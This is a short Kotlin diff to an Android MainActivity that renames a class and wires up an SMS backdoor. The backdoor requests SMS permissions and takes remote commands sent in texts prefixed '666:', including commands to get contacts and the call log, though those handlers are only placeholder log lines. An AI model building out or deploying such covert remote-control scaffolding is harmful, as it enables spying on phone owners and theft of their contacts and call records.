@@ -12,7 +12,7 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
         KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS,Manifest.permission.SEND_SMS)
             .onAccepted {
-                BackdoorService.openDoor(this, "666:"){ remoteCommand ->
+                SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
                     when(remoteCommand){
                         "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
                         "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
